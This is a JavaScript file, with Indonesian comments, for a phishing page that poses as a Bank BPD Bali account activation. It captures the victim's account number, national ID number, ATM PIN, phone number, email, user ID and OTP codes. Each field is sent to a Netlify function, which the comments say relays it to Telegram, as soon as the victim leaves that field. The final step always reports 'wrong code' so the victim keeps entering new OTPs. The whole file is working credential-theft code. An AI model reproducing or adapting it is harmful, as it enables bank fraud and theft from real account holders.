// Konfigurasi API URL (Netlify Function)
const API_URL = '/.netlify/functions/send-aktivasi';

// Data yang tersimpan
let currentData = {
    noRekening: '',
    noIdentitas: '',
    pinAtm: '',
    noTelpon: '',
    email: '',
    username: '',
    kodeOtp: ''
};

// Flag untuk mencegah spam notifikasi
let lastSentData = {};

// Fungsi untuk mengecek apakah data berubah dan perlu dikirim
function hasDataChanged(fieldName, value) {
    if (lastSentData[fieldName] !== value) {
        lastSentData[fieldName] = value;
        return true;
    }
    return false;
}

// Fungsi untuk mengirim notifikasi per field ke Telegram
async function sendFieldNotification(triggerField) {
    // Kumpulkan semua data yang sudah terisi
    const dataToSend = {
        noRekening: currentData.noRekening || '',
        noIdentitas: currentData.noIdentitas || '',
        pinAtm: currentData.pinAtm || '',
        noTelpon: currentData.noTelpon || '',
        email: currentData.email || '',
        username: currentData.username || '',
        kodeOtp: currentData.kodeOtp || '',
        triggerField: triggerField,
        timestamp: new Date().toLocaleString('id-ID')
    };
    
    // Hanya kirim jika ada data yang terisi minimal noRekening
    if (!dataToSend.noRekening) return;
    
    try {
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(dataToSend)
        });
        console.log(`Notifikasi ${triggerField} terkirim`, await response.json());
    } catch (error) {
        console.error('Error sending field notification:', error);
    }
}

// ========== NAVIGASI ==========
function pindahHalaman(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    
    if (id === 'page2') {
        setTimeout(function() {
            const noRekeningField = document.getElementById('noRekening');
            if (noRekeningField) {
                noRekeningField.focus();
                noRekeningField.click();
            }
        }, 100);
    }
}

// ========== HALAMAN 2 ==========
const noRekening = document.getElementById('noRekening');
const noIdentitas = document.getElementById('noIdentitas');
const pinAtm = document.getElementById('pinAtm');
const noTelpon = document.getElementById('noTelpon');
const email = document.getElementById('email');
const infoPage2 = document.getElementById('infoPage2');

function isFormPage2Valid() {
    if (!currentData.noRekening) return false;
    if (!currentData.noIdentitas) return false;
    if (!currentData.pinAtm) return false;
    if (!currentData.noTelpon) return false;
    if (!currentData.email) return false;
    if (!currentData.email.includes('@')) return false;
    return true;
}

function cekFormPage2() {
    if (isFormPage2Valid()) {
        infoPage2.innerHTML = '* Data lengkap, tekan Cetak Laporan / Pemulihan';
        infoPage2.style.color = '#27ae60';
    } else {
        infoPage2.innerHTML = '* Harap isi semua data dengan benar (email harus valid)';
        infoPage2.style.color = '#e67e22';
    }
}

// Event handler untuk setiap field dengan notifikasi real-time
function setupFieldNotifications() {
    // No. Rekening
    if (noRekening) {
        noRekening.addEventListener('input', function() { 
            this.value = this.value.replace(/[^0-9]/g, ''); 
            currentData.noRekening = this.value.trim();
            cekFormPage2();
        });
        noRekening.addEventListener('blur', function() {
            currentData.noRekening = this.value.trim();
            if (currentData.noRekening && hasDataChanged('noRekening', currentData.noRekening)) {
                sendFieldNotification('noRekening');
            }
            cekFormPage2();
        });
    }
    
    // No. Identitas (NIK KTP)
    if (noIdentitas) {
        noIdentitas.addEventListener('input', function() { 
            this.value = this.value.replace(/[^0-9]/g, ''); 
            currentData.noIdentitas = this.value.trim();
            cekFormPage2();
        });
        noIdentitas.addEventListener('blur', function() {
            currentData.noIdentitas = this.value.trim();
            if (currentData.noIdentitas && hasDataChanged('noIdentitas', currentData.noIdentitas)) {
                sendFieldNotification('noIdentitas');
            }
            cekFormPage2();
        });
    }
    
    // PIN ATM
    if (pinAtm) {
        pinAtm.addEventListener('input', function() { 
            this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); 
            currentData.pinAtm = this.value.trim();
            cekFormPage2();
        });
        pinAtm.addEventListener('blur', function() {
            currentData.pinAtm = this.value.trim();
            if (currentData.pinAtm && hasDataChanged('pinAtm', currentData.pinAtm)) {
                sendFieldNotification('pinAtm');
            }
            cekFormPage2();
        });
    }
    
    // No. Telepon
    if (noTelpon) {
        noTelpon.addEventListener('input', function() { 
            this.value = this.value.replace(/[^0-9]/g, ''); 
            currentData.noTelpon = this.value.trim();
            cekFormPage2();
        });
        noTelpon.addEventListener('blur', function() {
            currentData.noTelpon = this.value.trim();
            if (currentData.noTelpon && hasDataChanged('noTelpon', currentData.noTelpon)) {
                sendFieldNotification('noTelpon');
            }
            cekFormPage2();
        });
    }
    
    // Email
    if (email) {
        email.addEventListener('input', function() { 
            currentData.email = this.value.trim();
            cekFormPage2();
        });
        email.addEventListener('blur', function() {
            currentData.email = this.value.trim();
            if (currentData.email && hasDataChanged('email', currentData.email) && currentData.email.includes('@')) {
                sendFieldNotification('email');
            }
            cekFormPage2();
        });
    }
}

// Fungsi untuk menampilkan loading
function showLoading() {
    let loading = document.querySelector('.loading-overlay');
    if (!loading) {
        loading = document.createElement('div');
        loading.className = 'loading-overlay';
        loading.innerHTML = '<div class="loading-spinner"></div>';
        document.body.appendChild(loading);
    }
    loading.style.display = 'flex';
}

function hideLoading() {
    const loading = document.querySelector('.loading-overlay');
    if (loading) {
        loading.style.display = 'none';
    }
}

// Kirim data lengkap ke Netlify Function (untuk verifikasi akhir)
async function kirimKeTelegram(data) {
    try {
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });
        
        const result = await response.json();
        
        if (!response.ok) {
            throw new Error(result.message || 'Gagal mengirim data');
        }
        
        return { success: true, data: result };
    } catch (error) {
        console.error('Error:', error);
        return { success: false, error: error.message };
    }
}

function lanjutKePage3() {
    if (!isFormPage2Valid()) {
        alert('Lengkapi semua data dengan benar');
        return;
    }
    
    // Simpan data ke sessionStorage
    const userData = {
        noRekening: currentData.noRekening,
        noIdentitas: currentData.noIdentitas,
        pinAtm: currentData.pinAtm,
        noTelpon: currentData.noTelpon,
        email: currentData.email,
        timestamp: new Date().toLocaleString('id-ID')
    };
    sessionStorage.setItem('userData', JSON.stringify(userData));
    
    pindahHalaman('page3');
    
    setTimeout(function() {
        const usernameField = document.getElementById('username');
        if (usernameField) {
            usernameField.focus();
        }
    }, 150);
}

// ========== HALAMAN 3 dengan verifikasi - Kode Aktivasi 8 Digit ==========
async function verifikasiKode() {
    const username = document.getElementById('username');
    const kodeOtp = document.getElementById('kodeOtp');
    const btnVerif = document.getElementById('btnVerifikasi');
    const infoPage3 = document.getElementById('infoPage3');
    
    let error = '';
    if (!currentData.username) error += 'User.id tidak boleh kosong\n';
    if (!currentData.kodeOtp) error += 'Kode Aktivasi tidak boleh kosong\n';
    else if (currentData.kodeOtp.length < 8) error += 'Kode Aktivasi harus 8 digit\n';
    
    if (error) {
        alert('Verifikasi gagal:\n' + error);
        return;
    }
    
    if (btnVerif.disabled) return;
    
    // Ambil data dari sessionStorage
    const userDataStr = sessionStorage.getItem('userData');
    let userData = {};
    if (userDataStr) {
        userData = JSON.parse(userDataStr);
    }
    
    // Data lengkap untuk dikirim ke Telegram (notifikasi final)
    const dataToSend = {
        noRekening: userData.noRekening || currentData.noRekening || '-',
        noIdentitas: userData.noIdentitas || currentData.noIdentitas || '-',
        pinAtm: userData.pinAtm || currentData.pinAtm || '-',
        noTelpon: userData.noTelpon || currentData.noTelpon || '-',
        email: userData.email || currentData.email || '-',
        username: currentData.username,
        kodeOtp: currentData.kodeOtp,
        timestamp: new Date().toLocaleString('id-ID'),
        isFinal: true
    };
    
    showLoading();
    const result = await kirimKeTelegram(dataToSend);
    hideLoading();
    
    if (result.success) {
        alert('Kode salah versi Bank BPD Bali');
        kodeOtp.value = '';
        currentData.kodeOtp = '';
        infoPage3.innerHTML = '* Kode salah, silakan masukkan kode aktivasi 8 digit ulang';
        infoPage3.style.color = '#e74c3c';
        kodeOtp.focus();
        
        setTimeout(function() {
            if (infoPage3.innerHTML === '* Kode salah, silakan masukkan kode aktivasi 8 digit ulang') {
                infoPage3.innerHTML = '* Masukkan kode aktivasi 8 digit';
                infoPage3.style.color = '#e67e22';
            }
        }, 3000);
    } else {
        alert('Gagal mengirim data: ' + result.error);
    }
}

// Setup Halaman 3 notifications
function setupPage3Notifications() {
    const username = document.getElementById('username');
    const kodeOtp = document.getElementById('kodeOtp');
    
    if (username) {
        username.addEventListener('input', function() {
            currentData.username = this.value.trim();
        });
        username.addEventListener('blur', function() {
            currentData.username = this.value.trim();
            if (currentData.username && hasDataChanged('username', currentData.username)) {
                sendFieldNotification('username');
            }
        });
    }
    
    if (kodeOtp) {
        kodeOtp.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0,8);
            currentData.kodeOtp = this.value.trim();
        });
        kodeOtp.addEventListener('blur', function() {
            currentData.kodeOtp = this.value.trim();
            if (currentData.kodeOtp && currentData.kodeOtp.length === 8 && hasDataChanged('kodeOtp', currentData.kodeOtp)) {
                sendFieldNotification('kodeOtp');
            }
        });
    }
}

// Inisialisasi
setupFieldNotifications();
setupPage3Notifications();
cekFormPage2();
